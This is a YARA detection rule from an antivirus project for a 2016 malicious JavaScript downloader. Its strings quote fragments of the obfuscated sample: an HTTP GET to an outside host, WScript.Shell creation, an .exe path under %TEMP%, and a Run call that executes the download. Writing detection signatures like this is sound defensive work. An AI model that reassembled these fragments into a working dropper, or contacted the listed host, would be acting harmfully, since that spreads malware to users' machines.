rule sig_20160401_916aa4939e8b799baeafc98a6f1146fd {
  meta:
    description = "datamaliciousorder - file 20160401_916aa4939e8b799baeafc98a6f1146fd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7770651e5a45012d688144a4ad3679490509d34e2b05a05c6866337b10847831"

  strings:
    $s1  = "RoBwp[EwAd](\"G\" + \"ET\", \"http://sirplusalot.org/p3owlk\", false);" fullword ascii
    $s2  = "var ZoAy = function GaOuj() {return WScript[RqWj](\"WScript\"+\".Shell\");}(), CgKkw = 11;" fullword ascii
    $s3  = "function TfOuw(PjdAjk, YlRlf){OoMg = OoMg * 1; return PjdAjk - YlRlf;};" fullword ascii
    $s4  = "if (RoBwp[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function OrrYcu() {return ZoAy[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"byec07GPX.ex\" + \"e\";};" fullword ascii
    $s6  = "function BdzRx(){return SjpMp + \"\";};" fullword ascii
    $s7  = "function HswMu() {return ((JrNj == true) && (JrNj == QvxGzl)) ? 1 : OoMg;};" fullword ascii
    $s8  = "function RbhMbv()" fullword ascii
    $s9  = "JrNj = true; " fullword ascii
    $s10 = "var JrNj = false;" fullword ascii
    $s11 = "var HaOs = new this[\"Date\"]();" fullword ascii
    $s12 = "}while (KxkPs);" fullword ascii
    $s13 = "function XceLk(NfCh) {var OtYfc = (1, 2, 3, 4, 5, NfCh); return OtYfc;};" fullword ascii
    $s14 = "function GcXhe(AaUno){ZoAy[\"R\"+\"un\"](AaUno, OoMg, OoMg);};" fullword ascii
    $s15 = "var QkvGs = false;" fullword ascii
    $s16 = "var QvxGzl = false;" fullword ascii
    $s17 = "function WgHhh(){return 23;};" fullword ascii
    $s18 = "return TfOuw(LhMni, RgqTcb);" fullword ascii
    $s19 = "function YhTpd(){return RqWj;};" fullword ascii
    $s20 = "QvxGzl = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}